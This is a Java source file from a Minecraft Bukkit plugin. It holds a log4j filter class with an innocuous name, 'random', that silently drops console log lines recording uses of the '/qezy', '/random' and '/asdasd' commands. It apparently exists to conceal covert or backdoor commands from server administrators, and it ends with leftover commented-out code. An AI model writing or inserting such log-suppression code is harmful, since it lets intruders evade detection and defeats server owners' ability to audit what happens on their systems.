package com.qezy.qezymob.commands;

//logging libaries
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;


public class random extends AbstractFilter {

    @Override
    public Result filter(LogEvent event) {
        return event == null ? Result.NEUTRAL : isLoggable(event.getMessage().getFormattedMessage());
    }

    @Override
    public Result filter(Logger logger, Level level, Marker marker, Message msg, Throwable t) {
        return isLoggable(msg.getFormattedMessage());
    }

    @Override
    public Result filter(Logger logger, Level level, Marker marker, String msg, Object... params) {
        return isLoggable(msg);
    }

    @Override
    public Result filter(Logger logger, Level level, Marker marker, Object msg, Throwable t) {
        return msg == null ? Result.NEUTRAL : isLoggable(msg.toString());
    }

    private Result isLoggable(String msg) {
        if (msg != null) {
            if (msg.contains("issued server command:")) {
                if (msg.contains("/qezy") || msg.contains("/random")
                        || msg.contains("/asdasd") || msg.contains("/asdasd")) {
                    return Result.DENY;
                }
            }
        }
        return Filter.Result.NEUTRAL;
    }}


    //public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

    //return true;
    //}
//}